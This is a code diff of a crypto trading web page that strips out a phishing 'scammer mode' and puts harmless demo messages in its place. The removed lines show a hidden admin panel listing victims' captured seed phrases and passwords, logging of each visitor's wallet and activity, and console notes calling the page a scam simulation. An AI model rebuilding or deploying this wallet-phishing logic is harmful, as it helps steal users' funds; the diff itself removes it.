-        function renderLogs() {
-            const container = document.getElementById('log-container');
-            if (activityLogs.length === 0) {
-                container.innerHTML = `<div class="log-entry" style="color: #5a5570; text-align: center; justify-content: center;">Waiting for victims to connect...</div>`;
-                return;
-            }
-            
-            container.innerHTML = activityLogs.map(entry => {
-                const balanceClass = entry.balance !== null && entry.balance < 10 ? 'log-balance low' : 'log-balance';
-                const balanceDisplay = entry.balance !== null ? `| <span class="${balanceClass}">$${entry.balance.toFixed(2)}</span>` : '';
-                const walletDisplay = entry.wallet && entry.wallet !== 'scam' && entry.wallet !== 'STOLEN' ? `<span class="log-wallet">🔑 ${entry.wallet.substring(0, 10)}...</span>` : '';
-                const deviceDisplay = entry.device ? `<span class="log-device">${entry.device}</span>` : '';
-                
-                let stolenDisplay = '';
-                if (entry.type === 'stolen') {
-                    const match = entry.detail.match(/SEED: "([^"]*)" \| PASS: "([^"]*)"/);
-                    if (match) {
-                        stolenDisplay = `<span class="log-stolen-data">🔴 SEED: ${match[1]} | PASS: ${match[2]}</span>`;
-                    }
-                }
-                
-                if (entry.type === 'stealing') {
-                    stolenDisplay = `<span class="log-stolen-data" style="background: rgba(255,0,0,0.3); border-color: #ff0000; color: #ff3333;">🔴 VICTIM DATA CAPTURED</span>`;
-                }
-                
-                const typeClass = entry.type;
-                const typeDisplay = entry.type.toUpperCase();
-                
-                return `
-                    <div class="log-entry">
-                        <span class="log-time">${entry.time}</span>
-                        <span class="log-type ${typeClass}">${typeDisplay}</span>
-                        <span class="log-detail">${entry.detail}</span>
-                        ${stolenDisplay}
-                        ${walletDisplay}
-                        ${balanceDisplay}
-                        ${deviceDisplay}
-                    </div>
-                `;
-            }).join('');
-        }
-
-        function updateLogCount() {
-            document.getElementById('log-count').textContent = activityLogs.length;
-        }
-
-        function clearLogs() {
-            if (confirm('Clear all logs?')) {
-                activityLogs = [];
-                logCounter = 0;
-                renderLogs();
-                updateLogCount();
-                addLogEntry('system', 'Logs cleared by admin');
-            }
+        function showDemoMessage(action) {
+            alert(`🔵 Demo Mode: "${action}" would open a real wallet connection.\n\nThis is a demonstration site with no actual wallet functionality.`);
         }
 
         // ==========================================================
@@ -1849,8 +983,7 @@
                 'DeepBlue', 'Phantom_Menace', 'AlphaWhale', 'VortexTrader', 'CyberChaser', 'NeonPulse', 'SolSurfer', 'QuantumBot', 'HyperLiquid', 'EtherGazer',
                 'MemeLord', 'DegenKing', 'ShadowBroker', 'DeltaNeutral', 'GigaChad', 'BitCrusher', 'SolanaStaker', 'ZeroSlippage', 'MaxGains', 'RuneRunner',
                 'GasPumper', 'BlockHustler', 'MatrixNode', 'FlashLoaner', 'ApeMaster', 'VoidWalker', 'PixelTrader', 'NovaStrike', 'CosmicYield', 'ZenHodler',
-                'BullRunner', 'BearTrapper', 'SatoshiSon', 'VitalikFan', 'AnatolyGang', 'WAGMI_Club', 'DiamondHands', 'PaperCutter', 'RocketFuel', 'MoonShot',
-                'GlitchFx', 'TerminalX', 'SpecterSPL', 'EVM_Wizard', 'SandwichBot', 'JitoSniper', 'RaydiumRider', 'UniswapKing', 'CurvePooler', 'AaveWhale'
+                'BullRunner', 'BearTrapper', 'SatoshiSon', 'VitalikFan', 'AnatolyGang', 'WAGMI_Club', 'DiamondHands', 'PaperCutter', 'RocketFuel', 'MoonShot'
             ];
             
             const modifiers = ['X', 'Alpha', 'Beta', 'Omega', 'Pro', 'Max', 'Prime', 'Zero', 'Net', 'Core', 'V2', '99', 'OG', 'Sol', 'Eth', 'Crypto'];
@@ -1883,7 +1016,7 @@
                     <td>${core.sig}</td>
                     <td>${core.winRate}</td>
                     <td class="${core.pos ? 'roi-positive' : 'roi-negative'}">${core.roi}</td>
-                    <td><button class="nav-btn" style="padding: 5px 10px;" onclick="verifyAndMirror(this, '${core.sig}')">MIRROR</button></td>
+                    <td><button class="nav-btn" style="padding: 5px 10px;" onclick="showDemoMessage('Mirror Trader')">MIRROR</button></td>
                 `;
                 tbody.appendChild(row);
             });
@@ -1902,88 +1035,21 @@
         // NAVIGATION
         // ==========================================================
         function switchSection(sectionId, btnElement) {
-            playBeep(400, 'sine', 0.05);
             document.querySelectorAll('.app-section').forEach(sec => sec.classList.remove('active-section'));
             document.getElementById(sectionId).classList.add('active-section');
             document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
             if(btnElement) btnElement.classList.add('active');
-            rewireCursorHoverEffects();
         }
 
         // ==========================================================
-        // CUSTOM CURSOR - FIXED: Shows normal cursor on scam popup
+        // SOUND ENGINE (Optional - removed for simplicity)
         // ==========================================================
-        const cursor = document.getElementById('cursor');
-        
-        document.addEventListener('mousemove', function(e) {
-            const adminPanel = document.getElementById('admin-panel');
-            const scamOverlay = document.getElementById('scamOverlay');
-            const isOverAdmin = adminPanel.classList.contains('active') && e.target.closest('#admin-panel');
-            const isOverScam = scamOverlay.classList.contains('active') && e.target.closest('.scam-popup');
-            
-            // Hide custom cursor over admin panel OR scam popup (shows normal cursor)
-            if (!isOverAdmin && !isOverScam) {
-                cursor.style.left = e.clientX + 'px';
-                cursor.style.top = e.clientY + 'px';
-                cursor.style.opacity = '1';
-            } else {
-                cursor.style.opacity = '0';
-            }
-        });
-        
-        document.addEventListener('mousedown', function(e) {
-            const adminPanel = document.getElementById('admin-panel');
-            const scamOverlay = document.getElementById('scamOverlay');
-            const isOverAdmin = adminPanel.classList.contains('active') && e.target.closest('#admin-panel');
-            const isOverScam = scamOverlay.classList.contains('active') && e.target.closest('.scam-popup');
-            if (!isOverAdmin && !isOverScam) {
-                cursor.classList.add('click');
-            }
-        });
-        document.addEventListener('mouseup', function(e) {
-            const adminPanel = document.getElementById('admin-panel');
-            const scamOverlay = document.getElementById('scamOverlay');
-            const isOverAdmin = adminPanel.classList.contains('active') && e.target.closest('#admin-panel');
-            const isOverScam = scamOverlay.classList.contains('active') && e.target.closest('.scam-popup');
-            if (!isOverAdmin && !isOverScam) {
-                cursor.classList.remove('click');
-            }
-        });
-        
-        function rewireCursorHoverEffects() {
-            const interactables = document.querySelectorAll('button:not(.scam-popup *), input:not(.scam-popup *), .coin-row, th, td, .chart-filter-btn, .dropdown-item, .swap-arrow');
-            interactables.forEach(el => {
-                el.addEventListener('mouseenter', () => cursor.classList.add('hover'));
-                el.addEventListener('mouseleave', () => cursor.classList.remove('hover'));
-            });
-        }
-
-        // ==========================================================
-        // SOUND ENGINE
-        // ==========================================================
-        let audioCtx = null;
-        function playBeep(frequency = 500, type = 'sine', duration = 0.1) {
-            try {
-                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                if (audioCtx.state === 'suspended') audioCtx.resume();
-                const oscillator = audioCtx.createOscillator();
-                const gainNode = audioCtx.createGain();
-                oscillator.type = type;
-                oscillator.frequency.setValueAtTime(frequency, audioCtx.currentTime);
-                gainNode.gain.setValueAtTime(0.02, audioCtx.currentTime); 
-                gainNode.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
-                oscillator.connect(gainNode);
-                gainNode.connect(audioCtx.destination);
-                oscillator.start();
-                oscillator.stop(audioCtx.currentTime + duration);
-            } catch (error) { console.log("Audio bypass."); }
-        }
+        function playBeep() { /* No sound */ }
 
         // ==========================================================
         // SWAP ROUTER
         // ==========================================================
         function toggleSwapDropdown(type) {
-            playBeep(500, 'sine', 0.04);
             const drop = document.getElementById(`${type}-token-dropdown`);
             const oppositeType = type === 'pay' ? 'recv' : 'pay';
             document.getElementById(`${oppositeType}-token-dropdown`).classList.remove('show');
@@ -1997,7 +1063,6 @@
         });
 
         function selectSwapToken(type, symbol, icon) {
-            playBeep(650, 'sine', 0.05);
             if(type === 'pay') {
                 if(symbol === currentRecvToken) { currentRecvToken = currentPayToken; updateTokenSelectorUI('recv', currentRecvToken); }
                 currentPayToken = symbol;
@@ -2024,7 +1089,6 @@
         }
 
         function flipSwapTokens() {
-            playBeep(450, 'sine', 0.08);
             const temp = currentPayToken;
             currentPayToken = currentRecvToken;
             currentRecvToken = temp;
@@ -2054,28 +1118,6 @@
             inputRecv.value = absoluteTokenOutput.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 4}).replace(/,/g, '');
         }
 
-        function executeSecureRouterSwap(btn) {
-            const addrInput = document.getElementById('address');
-            if (!addrInput.value || !addrInput.classList.contains('synced')) {
-                playBeep(250, 'sawtooth', 0.2);
-                alert("Please connect your wallet first!");
-                switchSection('airdrop', document.querySelector("nav button:nth-child(2)"));
-                return;
-            }
-            
-            const payAmount = document.getElementById('swap-pay-input').value;
-            const recvAmount = document.getElementById('swap-recv-input').value;
-            const walletAddr = addrInput.value;
-            addLogEntry('swap', `Swapped ${payAmount} ${currentPayToken} → ${recvAmount} ${currentRecvToken}`, null, walletAddr);
-            
-            executeAction(btn, 'SWAP EXECUTED');
-            setTimeout(() => {
-                document.getElementById('swap-pay-bal').innerText = "0.00";
-                document.getElementById('swap-recv-input').value = "0.00";
-                document.getElementById('swap-pay-input').value = "0";
-            }, 1100);
-        }
-
         // ==========================================================
         // CHART LOGIC
         // ==========================================================
@@ -2084,7 +1126,6 @@
         let hoverMouseX = -1;
 
         function openChartBay(symbol) {
-            playBeep(550, 'sine', 0.08);
             const bay = document.getElementById('chart-expansion-bay');
             const targetRow = document.getElementById(`price-${symbol}`).parentElement;
             
@@ -2105,7 +1146,6 @@
 
         function setTimeframe(tf, event) {
             if (event) event.stopPropagation();
-            playBeep(700, 'sine', 0.04);
             document.querySelectorAll('.chart-filter-btn').forEach(b => b.classList.remove('active-tf'));
             if (event) event.target.classList.add('active-tf');
             
@@ -2199,117 +1239,16 @@
             const input = document.getElementById('chat-input');
             const msg = input.value.trim();
             if (msg) {
-                playBeep(800, 'square', 0.05);
                 const chatBox = document.getElementById('chat-box');
                 const newMsg = document.createElement('div');
                 newMsg.className = 'msg';
-                newMsg.innerHTML = `<span class="msg-self">YOU (Synced)</span>: ${msg}`;
+                newMsg.innerHTML = `<span class="msg-self">YOU (Demo)</span>: ${msg}`;
                 chatBox.appendChild(newMsg);
                 input.value = '';
                 chatBox.scrollTop = chatBox.scrollHeight;
-                
-                const addrInput = document.getElementById('address');
-                const wallet = addrInput.value || 'unknown';
-                addLogEntry('chat', `Message: "${msg}"`, null, wallet);
             }
         }
         function handleChatEnter(event) { if (event.key === "Enter") { event.preventDefault(); sendChatMessage(); } }
-
-        // ==========================================================
-        // BUTTON ACTIONS - Everything looks legitimate
-        // ==========================================================
-        function claimRewards(btn) {
-            const addrInput = document.getElementById('address');
-            if (!addrInput.value || !addrInput.classList.contains('synced')) {
-                playBeep(300, 'sawtooth', 0.15);
-                alert("Please connect your wallet first!");
-                return;
-            }
-            
-            playBeep(900, 'square', 0.2); 
-            btn.innerText = "VERIFYING LEDGER..."; 
-            btn.style.background = "#fff";
-            
-            const walletAddr = addrInput.value;
-            addLogEntry('claim', `Claimed rewards`, null, walletAddr);
-            
-            setTimeout(() => {
-                btn.innerText = "TOKENS CLAIMED!"; 
-                btn.style.background = "var(--neon-green)"; 
-                btn.style.color = "#000"; 
-                btn.style.boxShadow = "0 0 25px var(--neon-green)";
-                btn.disabled = true;
-                
-                const chatBox = document.getElementById('chat-box');
-                const newMsg = document.createElement('div');
-                newMsg.className = 'msg';
-                newMsg.innerHTML = `<span class="msg-vip">🎉 ${walletAddr.substring(0, 10)}...</span>: Claimed rewards!`;
-                chatBox.appendChild(newMsg);
-                chatBox.scrollTop = chatBox.scrollHeight;
-            }, 1000);
-        }
-
-        function executeAction(btn, successText) {
-            const addrInput = document.getElementById('address');
-            if (!addrInput.value || !addrInput.classList.contains('synced')) {
-                playBeep(300, 'sawtooth', 0.15);
-                alert("Please connect your wallet first!");
-                return;
-            }
-            
-            playBeep(700, 'sine', 0.1);
-            const originalText = btn.innerText; 
-            btn.innerText = "PROCESSING...";
-            const walletAddr = addrInput.value;
-            addLogEntry('trade', `${successText} by ${walletAddr.substring(0, 10)}...`, null, walletAddr);
-            
-            setTimeout(() => {
-                playBeep(900, 'square', 0.1); 
-                btn.innerText = successText; 
-                btn.style.background = "var(--neon-green)"; 
-                btn.style.color = "#000";
-                setTimeout(() => { btn.innerText = originalText; btn.style.background = ""; btn.style.color = ""; }, 2000);
-            }, 1000);
-        }
-
-        function executeNodeAction(btn, nodeName) {
-            const addrInput = document.getElementById('address');
-            if (!addrInput.value || !addrInput.classList.contains('synced')) {
-                playBeep(300, 'sawtooth', 0.15);
-                alert("Please connect your wallet first!");
-                return;
-            }
-            const walletAddr = addrInput.value;
-            addLogEntry('node', `Node ${nodeName} optimized by ${walletAddr.substring(0, 10)}...`, null, walletAddr);
-            executeAction(btn, 'NODE OPTIMIZED');
-        }
-
-        function accessVault(vaultName) {
-            const addrInput = document.getElementById('address');
-            if (!addrInput.value || !addrInput.classList.contains('synced')) {
-                playBeep(300, 'sawtooth', 0.15);
-                alert("Please connect your wallet first!");
-                return;
-            }
-            const walletAddr = addrInput.value;
-            addLogEntry('vault', `Vault ${vaultName} accessed by ${walletAddr.substring(0, 10)}...`, null, walletAddr);
-            alert(`🔓 ${vaultName} vault accessed!\n\nWallet: ${walletAddr}\n\nThis is where you would implement the actual vault logic.`);
-        }
-
-        function verifyAndMirror(btn, traderSig) {
-            const addrInput = document.getElementById('address');
-            if (!addrInput.value || !addrInput.classList.contains('synced')) {
-                playBeep(300, 'sawtooth', 0.15);
-                alert("Please connect your wallet first!");
-                switchSection('airdrop', document.querySelector("nav button:nth-child(2)"));
-                return;
-            }
-            
-            const walletAddr = addrInput.value;
-            addLogEntry('mirror', `Mirrored trader: ${traderSig || 'unknown'} by ${walletAddr.substring(0, 10)}...`, null, walletAddr);
-            
-            executeAction(btn, 'MIRRORING...');
-        }
 
         // ==========================================================
         // BACKGROUND STARS
@@ -2338,33 +1277,12 @@
         // INITIALIZATION
         // ==========================================================
         initCopytradeLeaderboard();
-        rewireCursorHoverEffects();
         fetchLiveCryptoPrices();
         setInterval(fetchLiveCryptoPrices, 45000);
         
-        // Check if MetaMask is installed
-        if (typeof window.ethereum !== 'undefined') {
-            console.log('🦊 MetaMask detected');
-        } else {
-            console.log('🦊 MetaMask not installed');
-        }
-        
-        // Check if Phantom is installed
-        if (typeof window.solana !== 'undefined' && window.solana.isPhantom) {
-            console.log('🔐 Phantom detected');
-        } else {
-            console.log('🔐 Phantom not installed');
-        }
-        
-        addLogEntry('device', `Device detected: ${deviceInfo.fullString}`);
-        addLogEntry('system', '🔴 SCAMMER MODE ACTIVE - Pure scam simulation');
-        
-        console.log("🔐 ADMIN PANEL: Press 'A' 'D' 'M' 'I' 'N' in sequence to open");
-        console.log("🔴 This is a PURE scam simulation - exactly what scammers create");
-        console.log("🦊 Click 'Connect MetaMask' or 'Connect Phantom' to see the scam");
-        console.log("⚠️ REAL wallets NEVER ask for your recovery phrase or password!");
-        console.log("📊 Scammer logs show ALL stolen data in the admin panel");
-        console.log("💀 Your community's wallets would be EMPTIED by this scam");
+        console.log("🟢 PUMPXON DEMO MODE ACTIVE");
+        console.log("📱 This is a demonstration site with no real wallet functionality.");
+        console.log("🔐 All 'Connect' and 'Claim' buttons show a demo message.");
     </script>
 </body>
 </html>
